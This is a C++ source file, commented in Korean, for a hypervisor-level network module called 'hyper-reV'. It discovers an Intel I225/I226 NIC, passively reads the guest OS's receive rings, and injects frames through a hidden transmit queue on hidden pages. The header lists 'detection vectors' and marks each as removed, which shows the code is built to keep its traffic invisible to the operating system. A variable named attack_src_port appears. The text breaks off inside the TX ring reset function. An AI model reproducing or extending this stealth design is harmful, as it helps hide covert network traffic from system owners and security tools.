#include "network.h"
#include "nic.h"
#include "packet.h"
#include "ip_frag.h"
#include "../dma/dma_handler.h"
#include "../dma/dma_protocol.h"
#include "../memory_manager/memory_manager.h"
#include "../memory_manager/heap_manager.h"
#include "../slat/slat.h"
#include "../slat/cr3/cr3.h"
#include "../crt/crt.h"

#include <immintrin.h>    // _mm_sfence(), _mm_clflush()
#include <intrin.h>       // __rdtsc()

// ============================================================================
// [핵심] hyper-reV 네트워크 모듈 - 읽기 전용 아키텍처
// ============================================================================
// RX (수신): 100% 읽기 전용!
//   - I225-V(igc): 4개 RX 큐 전부 폴링 (MRQC/RETA 수정 0)
//   - 큐별 buffer address 캐시 + RDT 추적 갱신
//   - NIC 레지스터 쓰기: 0회 (read_reg만 사용)
//
// TX (송신): 최소 변조
//   - TX Queue 1 전용 격리: hidden page 기반, OS Q0 완전 분리
//   - VA→PA 변환으로 hidden page GPA를 NIC Q1 레지스터에 등록
//   - TX stats 클리어 제거 (감지 벡터 제거)
//   - Q1 미초기화시 Q0 fallback (inject_tx_frame_intel_igc_q0_fallback)
//
// 감지 벡터 분석:
//   ✅ MRQC/RETA 레지스터 수정: 제거됨
//   ✅ TX stats 클리어: 제거됨
//   ✅ RSS 주기적 감시 write: 제거됨
//   ✅ OS TX Q0 TDT write: 제거됨 (Q1 TDT 0xE058 사용)
//   ✅ OS TX Q0 buffer 오염: 제거됨 (hidden page 사용)
// ============================================================================

namespace
{
    std::uint8_t* response_buffer = nullptr;
    std::uint32_t response_buffer_size = 0;
    std::uint8_t* tx_frame_buffer = nullptr;
    std::uint8_t* reasm_buffer = nullptr;

    std::uint32_t our_ip = 0;
    std::uint16_t our_src_port = 0;
    std::uint16_t attack_src_port = 0;
    cr3 cached_slat_cr3 = {};

    constexpr std::uint64_t POLL_INTERVAL_TSC = 0;
    std::uint64_t last_poll_tsc = 0;
    std::uint64_t poll_counter = 0;

    inline std::uint64_t read_tsc()
    {
        return __rdtsc();
    }

    // ========================================================================
    // Deferred TX State Machine
    // ========================================================================
    constexpr std::uint32_t MAX_CHUNKS_PER_EXIT = 100;

    struct deferred_tx_state_t
    {
        std::uint8_t  active;
        std::uint32_t next_chunk;
        std::uint32_t total_chunks;
        std::uint32_t payload_size;
        std::uint32_t response_seq;
        std::uint32_t chunks_sent_ok;
        std::uint64_t start_tsc;
    };
    deferred_tx_state_t deferred_tx = {};
    std::uint32_t deferred_tx_seq_counter = 0;

    // [핵심] Deferred TX stale timeout
    // 클라이언트가 죽으면 응답을 계속 보내봤자 의미 없음
    // 정상 전송: 722 chunks / 100 per exit × 15ms = ~120ms
    // CPU clock 변동 고려 (3-5GHz):
    //   5B TSC @ 3GHz = 1.67초, @ 5GHz = 1.0초
    // → 정상 전송(120ms)에 절대 간섭 안 하면서 클라이언트 사망은 감지
    constexpr std::uint64_t DEFERRED_TX_TIMEOUT_TSC = 5000000000ULL;
}

// ============================================================================
// NIC Register R/W — MMIO only (Intel I225-V)
// ============================================================================

std::uint32_t nic::read_reg(const void* slat_cr3_ptr, const std::uint32_t offset)
{
    const cr3 slat = *static_cast<const cr3*>(slat_cr3_ptr);
    const auto* ptr = static_cast<const volatile std::uint32_t*>(
        memory_manager::map_guest_physical(slat, state.mmio_base_gpa + offset));
    return ptr ? *ptr : 0;
}

void nic::write_reg(const void* slat_cr3_ptr, const std::uint32_t offset, const std::uint32_t value)
{
    const cr3 slat = *static_cast<const cr3*>(slat_cr3_ptr);
    auto* ptr = static_cast<volatile std::uint32_t*>(
        memory_manager::map_guest_physical(slat, state.mmio_base_gpa + offset));
    if (ptr) *ptr = value;
}

std::uint8_t nic::read_reg8(const void* slat_cr3_ptr, const std::uint32_t offset)
{
    const cr3 slat = *static_cast<const cr3*>(slat_cr3_ptr);
    const auto* ptr = static_cast<const volatile std::uint8_t*>(
        memory_manager::map_guest_physical(slat, state.mmio_base_gpa + offset));
    return ptr ? *ptr : 0;
}

void nic::write_reg8(const void* slat_cr3_ptr, const std::uint32_t offset, const std::uint8_t value)
{
    const cr3 slat = *static_cast<const cr3*>(slat_cr3_ptr);
    auto* ptr = static_cast<volatile std::uint8_t*>(
        memory_manager::map_guest_physical(slat, state.mmio_base_gpa + offset));
    if (ptr) *ptr = value;
}

// ============================================================================
// NIC Discovery - Intel I225/I226 ONLY, HIGHEST BUS 우선 (PCIe 슬롯 카드 선택)
// ============================================================================
// Intel I225-V (igc) NIC discovery — Intel only
// ECAM PCI scan → I225/I226 detection → BAR0 MMIO setup
// I225-V: MMIO BAR0, igc 드라이버, TX Q1 격리 전송 작동 확인됨
//
// 문제: 온보드 Intel NIC도 있을 수 있음
// 해결: 전체 bus 스캔 후 가장 높은 bus의 I225/I226 선택
//       → PCIe 슬롯 카드는 root port 브릿지를 거쳐 항상 높은 bus 배정
// ============================================================================

std::uint8_t nic::discover_nic(const void* slat_cr3_ptr)
{
    const cr3 slat = *static_cast<const cr3*>(slat_cr3_ptr);

    // 디버그 카운터 리셋
    dbg_scan_total_devs = 0;
    dbg_scan_intel_found = 0;      // Intel match count로 재활용
    dbg_scan_igc_found = 0;  // I225/I226 match count로 재활용
    dbg_scan_map_fail = 0;
    dbg_scan_last_vid = 0;
    dbg_scan_last_did = 0;
    dbg_scan_last_bus = 0;
    dbg_match_bus = 0xFF;    // best match bus로 재활용
    dbg_fail_step = 0;
    dbg_bar0_raw = 0;
    dbg_class = 0;
    dbg_subclass = 0;

    // ECAM base 탐지
    if (ecam_base_detected == 0)
    {
        for (std::uint32_t i = 0; i < ECAM_CANDIDATE_COUNT; i++)
        {
            const std::uint64_t test_gpa = ECAM_CANDIDATES[i] + PCI_VENDOR_ID;
            const auto* test_ptr = static_cast<const std::uint16_t*>(
                memory_manager::map_guest_physical(slat, test_gpa));
            if (!test_ptr) continue;

            const std::uint16_t test_vid = *test_ptr;
            if (test_vid != 0xFFFF && test_vid != 0x0000)
            {
                ecam_base_detected = ECAM_CANDIDATES[i];
                break;
            }
        }
        if (ecam_base_detected == 0) return 0;
    }

    // [Intel I225/I226 HIGHEST BUS] 전체 스캔
    std::uint8_t  best_bus = 0;
    std::uint8_t  best_dev = 0;
    std::uint8_t  best_func = 0;
    std::uint16_t best_did = 0;
    std::uint64_t best_mmio = 0;
    std::uint8_t  found = 0;

    for (std::uint8_t bus = 0; bus < 32; bus++)
    {
        for (std::uint8_t dev = 0; dev < 32; dev++)
        {
            for (std::uint8_t func = 0; func < 8; func++)
            {
                const std::uint64_t vid_gpa = ecam_address(bus, dev, func, PCI_VENDOR_ID);
                const auto* vid_ptr = static_cast<const std::uint16_t*>(
                    memory_manager::map_guest_physical(slat, vid_gpa));
                if (!vid_ptr) { dbg_scan_map_fail++; continue; }

                const std::uint16_t vendor_id = *vid_ptr;
                if (vendor_id == 0xFFFF || vendor_id == 0x0000) continue;

                dbg_scan_total_devs++;
                dbg_scan_last_vid = vendor_id;
                dbg_scan_last_bus = bus;

                // [핵심] Intel만 허용
                if (vendor_id != INTEL_VENDOR_ID) continue;
                dbg_scan_intel_found++;  // Intel match count

                // Device ID 읽기
                const std::uint64_t did_gpa = ecam_address(bus, dev, func, PCI_DEVICE_ID);
                const auto* did_ptr = static_cast<const std::uint16_t*>(
                    memory_manager::map_guest_physical(slat, did_gpa));
                if (!did_ptr) continue;

                const std::uint16_t device_id = *did_ptr;
                dbg_scan_last_did = device_id;

                // [핵심] I225/I226 계열만 허용 (igc 드라이버)
                if (!is_igc_nic(device_id)) continue;
                dbg_scan_igc_found++;  // I225/I226 match count

                // Class code 확인
                const std::uint64_t class_gpa = ecam_address(bus, dev, func, 0x0B);
                const auto* class_ptr = static_cast<const std::uint8_t*>(
                    memory_manager::map_guest_physical(slat, class_gpa));
                if (!class_ptr) { dbg_fail_step = 1; continue; }

                const std::uint64_t subclass_gpa = ecam_address(bus, dev, func, 0x0A);
                const auto* subclass_ptr = static_cast<const std::uint8_t*>(
                    memory_manager::map_guest_physical(slat, subclass_gpa));
                if (!subclass_ptr) { dbg_fail_step = 2; continue; }

                dbg_class = *class_ptr;
                dbg_subclass = *subclass_ptr;

                if (*class_ptr != PCI_CLASS_NETWORK || *subclass_ptr != PCI_SUBCLASS_ETHERNET)
                {
                    dbg_fail_step = 3; continue;
                }

                // BAR0 (MMIO) — Intel I225-V는 BAR0=MMIO (64-bit)
                const std::uint64_t bar0_gpa = ecam_address(bus, dev, func, PCI_BAR0);
                const auto* bar0_ptr = static_cast<const std::uint32_t*>(
                    memory_manager::map_guest_physical(slat, bar0_gpa));
                if (!bar0_ptr) { dbg_fail_step = 4; continue; }

                std::uint32_t bar_low = *bar0_ptr;
                dbg_bar0_raw = bar_low;

                // BAR0 bit0=1 → I/O space → Intel MMIO 아님, skip
                if (bar_low & 1) { dbg_fail_step = 5; continue; }

                std::uint64_t mmio_base = bar_low & 0xFFFFFFF0;

                // 64-bit BAR 체크: bit[2:1] = 10b → 64-bit
                if (((bar_low >> 1) & 3) == 2) {
                    const std::uint64_t bar1_gpa = ecam_address(bus, dev, func, PCI_BAR1);
                    const auto* bar1_ptr = static_cast<const std::uint32_t*>(
                        memory_manager::map_guest_physical(slat, bar1_gpa));
                    if (bar1_ptr)
                        mmio_base |= (static_cast<std::uint64_t>(*bar1_ptr) << 32);
                }

                if (mmio_base == 0 || mmio_base == 0xFFFFFFF0) { dbg_fail_step = 6; continue; }

                dbg_fail_step = 7; // OK - passed all checks

                // [핵심] 가장 높은 bus 선택 (PCIe 슬롯 우선)
                if (!found || bus > best_bus ||
                    (bus == best_bus && dev > best_dev) ||
                    (bus == best_bus && dev == best_dev && func > best_func))
                {
                    best_bus = bus;
                    best_dev = dev;
                    best_func = func;
                    best_did = device_id;
                    best_mmio = mmio_base;
                    found = 1;
                }
            }
        }
    }

    if (!found) return 0;

    state.bus = best_bus;
    state.dev = best_dev;
    state.func = best_func;
    state.vendor_id = INTEL_VENDOR_ID;
    state.device_id = best_did;
    state.mmio_base_gpa = best_mmio;
    state.nic_type = nic_type_t::INTEL;
    state.intel_gen = intel_gen_t::IGC;  // I225/I226 = igc

    dbg_match_bus = best_bus;  // best match bus 기록

    // ================================================================
    // CMD 활성화 — Bus Master + Memory Space
    // ================================================================
    {
        dbg_pci_cmd_before = pci_cf8_read16(best_bus, best_dev, best_func, 0x04);

        if ((dbg_pci_cmd_before & 0x0006) != 0x0006)  // MEM + Bus Master 필요
        {
            pci_cf8_write16(best_bus, best_dev, best_func, 0x04,
                dbg_pci_cmd_before | 0x0006);  // MEM+BM
            for (volatile int delay = 0; delay < 5000000; delay++) {}
        }
        dbg_pci_cmd_after = pci_cf8_read16(best_bus, best_dev, best_func, 0x04);
    }

    return 1;
}

// ============================================================================
// Ring Config
// ============================================================================

std::uint8_t nic::read_ring_config(const void* slat_cr3_ptr)
{
    const cr3 slat = *static_cast<const cr3*>(slat_cr3_ptr);

    if (state.nic_type == nic_type_t::INTEL)
    {
        // [핵심] igc vs e1000e: 올바른 레지스터 오프셋 사용
        const std::uint32_t rdbal = read_reg(slat_cr3_ptr, reg_rdbal(state));
        const std::uint32_t rdbah = read_reg(slat_cr3_ptr, reg_rdbah(state));
        const std::uint32_t rdlen = read_reg(slat_cr3_ptr, reg_rdlen(state));
        state.rx_ring_gpa = (static_cast<std::uint64_t>(rdbah) << 32) | rdbal;
        state.rx_ring_len = rdlen;
        state.rx_count = rdlen / sizeof(intel_rx_desc_t); // 16B per desc

        const std::uint32_t tdbal = read_reg(slat_cr3_ptr, reg_tdbal(state));
        const std::uint32_t tdbah = read_reg(slat_cr3_ptr, reg_tdbah(state));
        const std::uint32_t tdlen = read_reg(slat_cr3_ptr, reg_tdlen(state));
        state.tx_ring_gpa = (static_cast<std::uint64_t>(tdbah) << 32) | tdbal;
        state.tx_ring_len = tdlen;
        state.tx_count = tdlen / sizeof(intel_tx_desc_t);

        if (state.rx_ring_gpa == 0 || state.rx_count == 0) return 0;
        if (state.tx_ring_gpa == 0 || state.tx_count == 0) return 0;

        // [핵심] RDH는 반드시 올바른 오프셋에서 읽어야 함!
        state.our_rx_index = read_reg(slat_cr3_ptr, reg_rdh(state));
        state.our_tx_index = 0;

        // [핵심] igc인 경우 SRRCTL로 advanced descriptor 여부 확인
        if (state.intel_gen == intel_gen_t::IGC)
        {
            const std::uint32_t srrctl = read_reg(slat_cr3_ptr, IGC_REG_SRRCTL);
            const std::uint32_t desctype = srrctl & IGC_SRRCTL_DESCTYPE_MASK;
            state.use_adv_desc = (desctype != IGC_SRRCTL_DESCTYPE_LEGACY) ? 1 : 0;

            // advanced descriptor면 buffer address 캐싱
            if (state.use_adv_desc)
                cache_rx_buf_addrs(slat_cr3_ptr);
        }
        else
        {
            state.use_adv_desc = 0;
        }
    }

    return (state.rx_ring_gpa != 0) ? 1 : 0;
}

void nic::read_mac(const void* slat_cr3_ptr)
{
    if (state.nic_type == nic_type_t::INTEL)
    {
        const std::uint32_t ral = read_reg(slat_cr3_ptr, INTEL_REG_RAL0);
        const std::uint32_t rah = read_reg(slat_cr3_ptr, INTEL_REG_RAH0);
        state.mac[0] = static_cast<std::uint8_t>(ral);
        state.mac[1] = static_cast<std::uint8_t>(ral >> 8);
        state.mac[2] = static_cast<std::uint8_t>(ral >> 16);
        state.mac[3] = static_cast<std::uint8_t>(ral >> 24);
        state.mac[4] = static_cast<std::uint8_t>(rah);
        state.mac[5] = static_cast<std::uint8_t>(rah >> 8);
    }
}

// ============================================================================
// [핵심] RX Buffer Address Cache (igc advanced descriptor용)
// ============================================================================
// Advanced write-back에서 buffer_addr가 RSS hash로 덮어써지므로
// 드라이버가 write한 read format에서 pkt_addr를 미리 캐싱
// ============================================================================

void nic::cache_rx_buf_addrs(const void* slat_cr3_ptr)
{
    const cr3 slat = *static_cast<const cr3*>(slat_cr3_ptr);
    const std::uint32_t count = state.rx_count;
    if (count == 0 || count > MAX_RX_BUF_CACHE) return;

    // [핵심] 전체 ring 스캔해서 buffer address 캐싱
    // 아직 NIC가 처리하지 않은 descriptor는 read format (pkt_addr 유효)
    // 이미 처리된 descriptor는 write-back (pkt_addr = RSS hash = 무효)
    // → RDT~RDH 사이의 "available" descriptor에서만 유효한 주소를 얻을 수 있음
    // → 나머지는 드라이버가 recycle할 때 다시 read format으로 써줌

    // 현재 RDT 읽기 (드라이버가 NIC에 제공한 마지막 descriptor)
    const std::uint32_t rdt = read_reg(slat_cr3_ptr, reg_rdt(state));
    const std::uint32_t rdh = read_reg(slat_cr3_ptr, reg_rdh(state));

    for (std::uint32_t i = 0; i < count; i++)
    {
        const std::uint64_t desc_gpa = state.rx_ring_gpa + i * 16;

        // [핵심 버그 수정] DD 체크: WB format의 rss_hash를 pkt_addr로 오인 방지
        const auto* wb = static_cast<const igc_rx_desc_wb_t*>(
            memory_manager::map_guest_physical(slat, desc_gpa));
        if (!wb) continue;

        if (wb->staterr & IGC_RXD_STAT_DD) {
            // NIC 처리 완료 → WB format → pkt_addr 위치에 RSS hash
            rx_buf_cache[i] = 0;
            continue;
        }

        // DD=0 → READ format → pkt_addr 유효
        const auto* desc_read = static_cast<const igc_rx_desc_read_t*>(
            memory_manager::map_guest_physical(slat, desc_gpa));
        if (!desc_read) continue;

        const std::uint64_t addr = desc_read->pkt_addr;
        if (addr != 0 && addr < 0x0000FFFFFFFFFFFF)
            rx_buf_cache[i] = addr;
        else
            rx_buf_cache[i] = 0;
    }

    rx_buf_cache_valid = 1;
}

// ============================================================================
// [핵심] RX Buffer Cache 갱신 - 드라이버가 recycle한 descriptor 추적
// ============================================================================
// 드라이버가 RDT를 업데이트하면 그 사이의 descriptor는 새로운
// read format으로 써져있으므로 buffer address를 다시 캐싱
// ============================================================================

static std::uint32_t last_known_rdt = 0;

static void refresh_rx_buf_cache_igc()
{
    const cr3 slat = cached_slat_cr3;
    const std::uint32_t rdt = nic::read_reg(&slat, nic::reg_rdt(nic::state));

    if (rdt == last_known_rdt) return; // 변경 없음

    // RDT가 전진한 범위의 descriptor만 업데이트
    std::uint32_t idx = last_known_rdt;
    const std::uint32_t count = nic::state.rx_count;
    std::uint32_t updated = 0;

    while (idx != rdt && updated < count)
    {
        const std::uint64_t desc_gpa = nic::state.rx_ring_gpa + idx * 16;

        // [핵심 버그 수정] DD=0 확인 → READ format만 캐싱
        // DD=1이면 NIC가 이미 WB format으로 변환 → rss_hash를 pkt_addr로 오인
        const auto* wb = static_cast<const nic::igc_rx_desc_wb_t*>(
            memory_manager::map_guest_physical(slat, desc_gpa));

        if (wb && !(wb->staterr & nic::IGC_RXD_STAT_DD))
        {
            const auto* desc_read = static_cast<const nic::igc_rx_desc_read_t*>(
                memory_manager::map_guest_physical(slat, desc_gpa));

            if (desc_read)
            {
                const std::uint64_t addr = desc_read->pkt_addr;
                if (addr != 0 && addr < 0x0000FFFFFFFFFFFF && idx < nic::MAX_RX_BUF_CACHE)
                    nic::rx_buf_cache[idx] = addr;
            }
        }

        idx = (idx + 1) % count;
        updated++;
    }

    last_known_rdt = rdt;
}

// ============================================================================
// [핵심] IGC 멀티큐 RX 지원 - 읽기 전용 (NIC 레지스터 수정 0!)
// ============================================================================
// I225-V는 RSS로 4개 RX 큐에 패킷 분배. Queue 0만 읽으면 누락 발생.
// MRQC/RETA 수정하지 않고 4개 큐 전부 폴링하여 해결.
// ============================================================================

// IGC Queue 1~3 초기화 (Queue 0는 기존 read_ring_config에서 처리)
std::uint8_t nic::read_igc_multi_queue_config(const void* slat_cr3_ptr)
{
    const cr3 slat = *static_cast<const cr3*>(slat_cr3_ptr);
    igc_num_active_queues = 0;

    for (std::uint32_t q = 0; q < IGC_MAX_RX_QUEUES; q++)
    {
        const std::uint32_t rdbal = read_reg(slat_cr3_ptr, igc_rxq_rdbal(q));
        const std::uint32_t rdbah = read_reg(slat_cr3_ptr, igc_rxq_rdbah(q));
        const std::uint32_t rdlen = read_reg(slat_cr3_ptr, igc_rxq_rdlen(q));

        const std::uint64_t ring_gpa = (static_cast<std::uint64_t>(rdbah) << 32) | rdbal;
        const std::uint32_t desc_count = rdlen / 16; // 16B per descriptor

        igc_rxq[q].ring_gpa = ring_gpa;
        igc_rxq[q].count = desc_count;
        igc_rxq[q].active = (ring_gpa != 0 && desc_count > 0) ? 1 : 0;
        igc_rxq[q].buf_cache_valid = 0;

        if (igc_rxq[q].active)
        {
            // 현재 RDH를 시작점으로 설정 (이미 처리된 패킷 스킵)
            igc_rxq[q].our_index = read_reg(slat_cr3_ptr, igc_rxq_rdh(q));
            igc_rxq[q].last_known_rdt = read_reg(slat_cr3_ptr, igc_rxq_rdt(q));
            igc_num_active_queues++;

            // buffer address 캐싱
            cache_igc_queue_buf_addrs(slat_cr3_ptr, q);
        }
    }

    return (igc_num_active_queues > 0) ? 1 : 0;
}

// 큐별 buffer address 캐싱
void nic::cache_igc_queue_buf_addrs(const void* slat_cr3_ptr, std::uint32_t queue_idx)
{
    if (queue_idx >= IGC_MAX_RX_QUEUES) return;
    const auto& rxq = igc_rxq[queue_idx];
    if (!rxq.active || rxq.count == 0 || rxq.count > MAX_RXQ_BUF_CACHE) return;

    const cr3 slat = *static_cast<const cr3*>(slat_cr3_ptr);

    for (std::uint32_t i = 0; i < rxq.count; i++)
    {
        const std::uint64_t desc_gpa = rxq.ring_gpa + i * 16;

        // [핵심 버그 수정] DD=0만 READ format → pkt_addr 유효
        // DD=1이면 WB format → rss_hash가 pkt_addr 위치에 있음
        const auto* wb = static_cast<const igc_rx_desc_wb_t*>(
            memory_manager::map_guest_physical(slat, desc_gpa));
        if (!wb) continue;

        if (wb->staterr & nic::IGC_RXD_STAT_DD) {
            // WB format - pkt_addr 읽을 수 없음, 0으로 표시
            igc_rxq_buf_cache[queue_idx][i] = 0;
            continue;
        }

        // DD=0 → READ format → pkt_addr 안전
        const auto* desc_read = static_cast<const igc_rx_desc_read_t*>(
            memory_manager::map_guest_physical(slat, desc_gpa));
        if (!desc_read) continue;

        const std::uint64_t addr = desc_read->pkt_addr;
        if (addr != 0 && addr < 0x0000FFFFFFFFFFFF)
            igc_rxq_buf_cache[queue_idx][i] = addr;
        else
            igc_rxq_buf_cache[queue_idx][i] = 0;
    }

    igc_rxq[queue_idx].buf_cache_valid = 1;
}

// 큐별 buffer cache 갱신 (RDT 변경 추적)
void nic::refresh_igc_queue_buf_cache(const void* slat_cr3_ptr, std::uint32_t queue_idx)
{
    if (queue_idx >= IGC_MAX_RX_QUEUES) return;
    auto& rxq = igc_rxq[queue_idx];
    if (!rxq.active || !rxq.buf_cache_valid) return;

    const cr3 slat = *static_cast<const cr3*>(slat_cr3_ptr);
    const std::uint32_t rdt = read_reg(slat_cr3_ptr, igc_rxq_rdt(queue_idx));

    if (rdt == rxq.last_known_rdt) return;

    std::uint32_t idx = rxq.last_known_rdt;
    std::uint32_t updated = 0;

    while (idx != rdt && updated < rxq.count)
    {
        const std::uint64_t desc_gpa = rxq.ring_gpa + idx * 16;

        // [핵심 버그 수정] DD 비트 먼저 확인!
        // NIC가 이미 처리한 descriptor는 WB format이라
        // 첫 8바이트가 rss_hash+info로 변환됨 (pkt_addr 아님!)
        // DD=0인 경우에만 READ format이 보장됨 → pkt_addr 정상
        const auto* wb = static_cast<const igc_rx_desc_wb_t*>(
            memory_manager::map_guest_physical(slat, desc_gpa));

        if (wb && !(wb->staterr & IGC_RXD_STAT_DD))
        {
            // DD=0 → READ format → pkt_addr 유효
            const auto* desc_read = static_cast<const igc_rx_desc_read_t*>(
                memory_manager::map_guest_physical(slat, desc_gpa));

            if (desc_read)
            {
                const std::uint64_t addr = desc_read->pkt_addr;
                if (addr != 0 && addr < 0x0000FFFFFFFFFFFF && idx < MAX_RXQ_BUF_CACHE)
                    igc_rxq_buf_cache[queue_idx][idx] = addr;
            }
        }
        // DD=1 → WB format → 기존 캐시 유지 (덮어쓰지 않음!)

        idx = (idx + 1) % rxq.count;
        updated++;
    }

    rxq.last_known_rdt = rdt;
}

// ============================================================================
// TX Frame Injection - Intel (e1000e legacy)
// ============================================================================

static std::uint8_t inject_tx_frame_intel_legacy(
    const std::uint8_t* raw_frame,
    const std::uint32_t frame_len)
{
    const cr3 slat = cached_slat_cr3;
    const std::uint32_t tx_count = nic::state.tx_count;
    if (tx_count == 0) return 0;

    const std::uint32_t tdt = nic::read_reg(&slat, nic::reg_tdt(nic::state));
    std::uint32_t tdh = nic::read_reg(&slat, nic::reg_tdh(nic::state));
    const std::uint32_t next_tdt = (tdt + 1) % tx_count;

    if (next_tdt == tdh) {
        constexpr std::uint32_t MAX_DRAIN_POLLS = 1000;
        for (std::uint32_t spin = 0; spin < MAX_DRAIN_POLLS; spin++) {
            tdh = nic::read_reg(&slat, nic::reg_tdh(nic::state));
            if (next_tdt != tdh) break;
        }
        if (next_tdt == tdh) {
            network::packets_dropped++;
            return 0;
        }
    }

    const std::uint64_t desc_gpa = nic::state.tx_ring_gpa + tdt * sizeof(nic::intel_tx_desc_t);
    auto* desc = static_cast<nic::intel_tx_desc_t*>(
        memory_manager::map_guest_physical(slat, desc_gpa));
    if (!desc) return 0;

    if (desc->buffer_addr == 0) {
        network::packets_dropped++;
        return 0;
    }
    if (!(desc->status & nic::INTEL_TX_STATUS_DD) && desc->cmd != 0) {
        network::packets_dropped++;
        return 0;
    }

    auto* buf = static_cast<std::uint8_t*>(
        memory_manager::map_guest_physical(slat, desc->buffer_addr));
    if (!buf) return 0;

    crt::copy_memory(buf, raw_frame, frame_len);

    desc->length = static_cast<std::uint16_t>(frame_len);
    desc->cmd = nic::INTEL_TX_CMD_EOP | nic::INTEL_TX_CMD_IFCS | nic::INTEL_TX_CMD_RS;
    desc->status = 0;
    desc->cso = 0;
    desc->css = 0;
    desc->special = 0;

    _mm_sfence();
    nic::write_reg(&slat, nic::reg_tdt(nic::state), next_tdt);

    constexpr std::uint32_t MAX_TX_WAIT = 10000;
    for (std::uint32_t i = 0; i < MAX_TX_WAIT; i++) {
        if (desc->status & nic::INTEL_TX_STATUS_DD) break;
    }

    // [핵심] TX stats 클리어 제거 - 레지스터 변조 감지 벡터였음
    // e1000e legacy: Q1 격리 미적용 (IGC 전용). Q0 사용 유지.
    return 1;
}

// ============================================================================
// [핵심] TX Queue 1 초기화 - OS Queue 0과 완전 격리된 전용 TX 경로
// ============================================================================
// 구조:
//   hidden page 1: TX descriptor ring (256 desc × 16B = 4KB)
//   hidden page 2: TX data buffer (1 frame, 4KB)
//   모든 descriptor의 buffer_addr → data buffer GPA
//   NIC TX Q1 레지스터: TDBAL/TDBAH=ring GPA, TDLEN=4096, TXDCTL.ENABLE=1
//
// 이점:
//   ✅ OS TX Q0 TDT 변경: 0 (우리는 Q1 TDT만 사용)
//   ✅ OS TX 버퍼 덮어쓰기: 0 (우리 전용 hidden page)
//   ✅ OS TX ring 오염: 0 (별도 descriptor ring)
//   ✅ TX stats: OS Q0과 Q1 통계 혼재되지만 클리어 불필요
// ============================================================================

std::uint8_t nic::setup_igc_hv_tx_queue(const void* slat_cr3_ptr)
{
    if (!heap_va_pa_valid) return 0;

    // ========================================================================
    // [DPDK-style] 128 descriptors + 128 independent 2KB buffers
    // ========================================================================
    // desc ring: 128 × 16B = 2048B → 1 page (나머지 공간 미사용)
    // data bufs: 128 × 2KB  = 256KB → 64 pages (연속 할당)
    // 각 descriptor가 고유 buffer를 가리킴 → DD wait 없이 batch enqueue
    // ========================================================================
    constexpr std::uint32_t DESC_COUNT = BATCH_TX_RING_SIZE;  // 128

    if (!igc_hv_tx.desc_ring_va)
    {
        // Descriptor ring: 1 page
        void* desc_page = heap_manager::allocate_page();
        if (!desc_page) return 0;

        igc_hv_tx.desc_ring_gpa = va_to_gpa(desc_page);
        igc_hv_tx.desc_ring_va = desc_page;
        igc_hv_tx.desc_count = DESC_COUNT;

        // Per-slot data buffers: 각 2KB, 연속 페이지에서 2개씩
        // 1 page (4KB) = 2 slots × 2KB
        // 128 slots → 64 pages 필요
        constexpr std::uint32_t SLOTS_PER_PAGE = 2;
        constexpr std::uint32_t PAGES_NEEDED = DESC_COUNT / SLOTS_PER_PAGE;  // 64

        for (std::uint32_t p = 0; p < PAGES_NEEDED; p++)
        {
            void* page = heap_manager::allocate_page();
            if (!page) return 0;

            std::uint64_t page_gpa = va_to_gpa(page);

            // slot A = page + 0, slot B = page + 2048
            std::uint32_t slot_a = p * SLOTS_PER_PAGE;
            std::uint32_t slot_b = slot_a + 1;

            igc_hv_tx.buf_va[slot_a] = static_cast<std::uint8_t*>(page);
            igc_hv_tx.buf_gpa[slot_a] = page_gpa;
            igc_hv_tx.buf_va[slot_b] = static_cast<std::uint8_t*>(page) + BATCH_TX_BUF_SIZE;
            igc_hv_tx.buf_gpa[slot_b] = page_gpa + BATCH_TX_BUF_SIZE;
        }
    }

    // Ring 초기화: 모든 descriptor DD=1 (사용 가능 표시)
    crt::set_memory(igc_hv_tx.desc_ring_va, 0, 0x1000);
    auto* ring = static_cast<igc_tx_desc_t*>(igc_hv_tx.desc_ring_va);
    for (std::uint32_t i = 0; i < DESC_COUNT; i++)
    {
        ring[i].buffer_addr = igc_hv_tx.buf_gpa[i];
        ring[i].cmd_type_len = 0;
        ring[i].olinfo_status = IGC_TXD_STAT_DD;  // 초기: "완료됨" = 사용 가능
    }

    // SW pointers 초기화
    igc_hv_tx.sw_tail = 0;
    igc_hv_tx.sw_head = 0;
    igc_hv_tx.nb_tx_free = DESC_COUNT - 1;  // ring-1 규칙

    // NIC TX Queue 1 레지스터 프로그래밍
    const std::uint64_t desc_gpa = igc_hv_tx.desc_ring_gpa;
    write_reg(slat_cr3_ptr, IGC_TXQ1_TDBAL, static_cast<std::uint32_t>(desc_gpa & 0xFFFFFFFF));
    write_reg(slat_cr3_ptr, IGC_TXQ1_TDBAH, static_cast<std::uint32_t>(desc_gpa >> 32));
    write_reg(slat_cr3_ptr, IGC_TXQ1_TDLEN, DESC_COUNT * sizeof(igc_tx_desc_t));
    write_reg(slat_cr3_ptr, IGC_TXQ1_TDH, 0);
    write_reg(slat_cr3_ptr, IGC_TXQ1_TDT, 0);

    // Queue Enable + WTHRESH=1
    constexpr std::uint32_t TXDCTL_VAL = IGC_TXDCTL_ENABLE | (1u << 16);
    write_reg(slat_cr3_ptr, IGC_TXQ1_TXDCTL, TXDCTL_VAL);

    std::uint32_t txdctl_final = 0;
    for (std::uint32_t i = 0; i < 1000; i++)
    {
        txdctl_final = read_reg(slat_cr3_ptr, IGC_TXQ1_TXDCTL);
        if (txdctl_final & IGC_TXDCTL_ENABLE) break;
    }

    igc_hv_tx.dbg_txdctl_val = txdctl_final;
    igc_hv_tx.initialized = 1;
    return 1;
}

// ============================================================================
// [FIX] TX ring 리셋 - OPEN 수신 시 호출
// ============================================================================
// ============================================================================
// ============================================================================
// [v4 stable] TX ring 리셋 — 단순 TXDCTL toggle + desc reinit
// ============================================================================
// TDBAL 안 건드림 → OS igc driver와 충돌 없음 (v4 검증)
// TDBAL=0 복구? → setup_igc_hv_tx_queue 재호출로 처리 (OPEN 시)
// ============================================================================
void nic::reset_tx_ring(const void* slat_cr3_ptr)
{
    if (!igc_hv_tx.initialized) return;

    // 1. TX queue 비활성화
    write_reg(slat_cr3_ptr, IGC_TXQ1_TXDCTL, 0);
    for (int i = 0; i < 1000; i++) {
        if (!(read_reg(slat_cr3_ptr, IGC_TXQ1_TXDCTL) & IGC_TXDCTL_ENABLE)) break;
        _mm_pause();
    }

    // 2. Descriptor ring 재초기화 (batch TX: 각 slot 고유 buffer)
    auto* ring = static_cast<igc_tx_desc_t*>(igc_hv_tx.desc_ring_va);
    for (std::uint32_t i = 0; i < igc_hv_tx.desc_count; i++)
    {
        ring[i].buffer_addr = igc_hv_tx.buf_gpa[i];
        ring[i].cmd_type_len = 0;
        ring[i].olinfo_status = IGC_TXD_STAT_DD;
    }

